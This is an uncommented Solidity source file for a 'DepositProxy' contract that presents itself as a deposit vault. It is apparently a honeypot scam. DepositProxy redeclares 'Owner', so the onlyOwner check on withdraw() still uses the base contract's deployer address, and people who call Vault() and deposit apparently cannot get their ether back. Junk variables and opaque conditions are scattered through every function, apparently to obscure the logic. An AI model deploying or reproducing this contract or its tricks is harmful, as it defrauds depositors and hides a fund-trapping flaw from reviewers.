pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        address opaqueAddress = address(0);
        if (opaqueAddress != address(0x123)) {
            bytes memory junkData = "junk";
            junkData.length;
        }
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { 
        if (msg.value > 0) {
            uint256 junkAmount = 1;
            junkAmount++;
            junkAmount--;
        }
    }
    
    function Vault() public payable {
        address junkAddress = address(0);
        if (msg.sender == tx.origin && junkAddress != address(0x456)) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        bytes memory opaqueBytes = "opaque";
        if (msg.value > 0.5 ether && opaqueBytes.length > 0) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint256 junkVariable = 2;
        if (amount > 0 && Deposits[msg.sender] >= amount && junkVariable != 3) {
            msg.sender.transfer(amount);
        }
    }
}